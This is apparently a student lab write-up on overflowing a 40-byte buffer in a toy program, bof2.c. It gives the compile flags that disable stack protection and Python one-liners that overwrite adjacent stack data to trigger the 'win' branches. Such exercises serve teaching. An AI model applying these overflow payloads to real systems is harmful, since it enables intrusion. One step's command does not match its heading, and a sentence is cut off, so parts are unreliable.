# Understand bof2.c 
In this attack, we will try to replace the return address with another function's return address (redirect control) by using python!
## Stackframe
![image](https://github.com/user-attachments/assets/a5b70361-5f44-469d-8db8-7914351a69c7)
## Vulnerability
In the program, we see fgets(buf, 45, stdin), but buf only has 40 bytes, which leads to a buffer overflow. From here we can insert more address for the p
# Start attacking bof2.c 
## Compiling the file without stack restriction
`gcc -g bof2.c -o bof2.out -fno-stack-protector -mpreferred-stack-boundary=2`  
![image](https://github.com/user-attachments/assets/86572b26-3457-4c8f-9ae9-1d4e1ada24a2)
## Start inputing files with 0x4030201
`echo $(python -c "print('a'*40+'\x01\x02\x03\x04')") | ./bof2.out 123`  
![image](https://github.com/user-attachments/assets/4c998c8d-c9eb-43b1-82d2-5c66fc9733d9)  
=> We see that there is no message because the if clause is not touched!
## Try with other address: \xff\xff\xff\xff
`echo $(python -c "print('a'*40+'\x01\x02\x03\x04')") | ./bof2.out 123`  
![image](https://github.com/user-attachments/assets/5306b6f3-cc39-4f47-bf4c-1ba4f06d47e7)  
=> Now we see a message that "You are on the right way!"
## Now we input 0xdeadbeef to see the message from the second if!
`echo $(python -c "print('a'*40+'\xef\xbe\xad\xde')") | ./bof2.out 123`  
![image](https://github.com/user-attachments/assets/d27d391e-e953-46c6-87d9-321b1f42875d)  
=> You see that the message is "Yeah! You win!"
